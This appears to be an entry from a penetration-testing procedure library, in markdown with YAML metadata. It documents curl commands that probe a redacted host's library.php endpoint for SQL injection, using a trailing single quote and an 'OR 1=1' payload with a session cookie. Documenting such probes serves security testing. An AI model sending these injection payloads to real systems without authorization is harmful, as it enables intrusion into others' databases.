---
data: 'curl -X GET "https://████/library.php?path=test&doc_id=1''" -v'
tags:
  - sqli
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.225Z'
id: 9f3a427c-81ad-4023-90de-6b963f862373
verified: false
validated: true
submitted: true
---
# basic-sqli-identification-test

## Command

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1'" -v
```

## Description

Sends an HTTP GET request to test for SQL injection by appending a single quote to the doc_id parameter, observing verbose output for errors.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with payload | Yes |
| -v | Verbose mode for headers and errors | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1'" -v
```

### Advanced Usage

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 OR 1=1" -v --cookie "session=abc"
```

## Expected Output

Verbose curl output showing HTTP response, potentially a 500 error with database syntax error messages indicating vulnerability.

## Related

- [[Related Procedure]]
